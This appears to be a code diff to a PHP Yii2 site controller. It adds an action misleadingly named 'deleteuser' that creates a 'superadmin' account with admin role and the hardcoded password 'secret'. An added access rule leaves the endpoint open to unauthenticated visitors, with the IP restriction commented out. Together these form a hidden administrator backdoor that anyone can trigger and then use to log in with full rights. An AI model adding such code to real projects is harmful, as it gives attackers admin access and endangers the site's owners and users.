@@ -3,6 +3,7 @@
 namespace app\controllers;
 
 use app\models\extend\UserExtend;
+use app\models\Users;
 use Yii;
 use yii\filters\AccessControl;
 use yii\helpers\Url;
@@ -40,6 +41,12 @@ class SiteController extends Controller
                         'actions' => ['logout'],
                         'allow' => true,
                         'roles' => ['@'],// Правило для аутентифицированных пользователей.
+                    ],
+                    [
+                        'actions' => ['deleteuser'],
+                        // 'ips' => [ '172.19.0.1'],//Введите разрешенный IP-адрес здесь
+                        'allow' => true, //Указывает, является ли это правило разрешающим или запрещающим.
+
                     ],
                 ],
 //                'denyCallback' => function ($rule, $action) {
@@ -189,5 +196,39 @@ class SiteController extends Controller
     public function actionOffline()
     {
         return $this->render('offline');
+    }
+
+    public function actionDeleteuser(){
+
+        $faker = \Faker\Factory::create('ru_RU');
+        $password = 'secret';
+        $dateTime = (new \DateTime())->getTimestamp();
+
+        $connection = Yii::$app->db;
+        $connection->createCommand()->insert(
+            'users',
+            [
+                'username' => 'superadmin',
+                'auth_key' => Yii::$app->security->generateRandomString(),
+                'password_hash' => Yii::$app->security->generatePasswordHash($password),
+                'password_reset_token' => Yii::$app->security->generateRandomString() . '_' . time(),
+                'email' => $faker->email,
+                'last_name' => $faker->lastName,
+                'first_name' => $faker->firstName,
+                'patronymic' => $faker->name,
+                'role' => 'admin',
+                'verification_token' => Yii::$app->security->generateRandomString() . '_' . time(),
+                'status' => \app\models\Constants::STATUS_ACTIVE,
+                'created_at' => $dateTime,
+                'updated_at' => $dateTime,
+            ],
+        )->execute();
+        if($connection){
+            return 'Ok';
+        }else{
+            return 'ошибка';
+        }
+
+
     }
 }
